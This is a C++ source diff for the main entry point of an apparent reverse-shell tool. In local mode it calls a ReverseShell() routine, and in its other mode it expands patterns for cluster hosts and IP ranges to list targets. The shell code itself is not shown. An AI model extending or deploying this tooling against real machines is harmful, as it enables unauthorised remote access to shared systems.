@@ -1,64 +1,65 @@
 #include "Main.hpp"
-#include "TargetResolver.hpp"
+#include "ClusterHostGlober.hpp"
+#include "ReverseShell.hpp"
 #include <unistd.h>
 
 Main::Main(int ac, char **av) : _flags(0), _programName(av[0])
 {
-	char		ip[0xF0];
-	bool		error;
+	ClusterHostGlober		clusterIps;
 
-	_options(&ac, &av);
+	_Options(&ac, &av);
 
-	av--;
-	while (*++av)
+	///Local mode
+	if (ac == 0)
 	{
-		while (TargetResolver::Resolve(*av, ip, error))
-		{
-			if (error)
-				continue ;
-			_targetIps.push_back(ip);
-		}
+		ReverseShell();
 	}
+	else
+	{
+		av--;
+		while (*++av)
+			clusterIps.LoadHosts(*av);
 
-	std::cout << "ip targets:" << std::endl;
-	for (const std::string & cip : _targetIps)
-		std::cout << cip << std::endl; 
+		std::cout << "ip targets:" << std::endl;
+		for (const std::string & cip : clusterIps.GetIps())
+			std::cout << cip << std::endl; 
+	}
 }
 
 Main::~Main(void) {}
 
-void		Main::_options(int *argc, char ***argv)
+void		Main::_Options(int *argc, char ***argv)
 {
 	int		ch;
 
-	if (*argc <= 1)
-		_usage();
-	while ((ch = getopt(*argc, *argv, "f:x")) != -1) {
+	while ((ch = getopt(*argc, *argv, "h")) != -1) {
 		switch (ch) {
 			case 'x':
 				_flags |= ShowExpanded;
 				break ;
 			case '?':
+			case 'h':
 			default:
-				_usage();
+				_Usage();
 		}
 	}
 	*argc -= optind;
 	*argv += optind;
 }
 
-void		Main::_usage(void)
+void		Main::_Usage(void)
 {
-	std::cout << "usage: " << _programName << " hostname1 ip2 10.11.[1-9].[1.8] ..." << std::endl;
+	std::cout << "reverse shell:" << std::endl;
+	std::cout << "\t$ " << _programName << " '10.11.[1-9].[1-8]'" << std::endl;
+	std::cout << "\t$ " << _programName << " 'e1r10p[1-23]'" << std::endl;
+	std::cout << "client" << std::endl;
+	std::cout << "\t$ " << _programName << std::endl;
 	exit(-1);
-}
-
-int			Main::Run(void)
-{
-	return (0);
 }
 
 int		main(int ac, char **av)
 {
-	return (Main(ac, av).Run());
+	Main(ac, av);
+
+	return (0);
 }
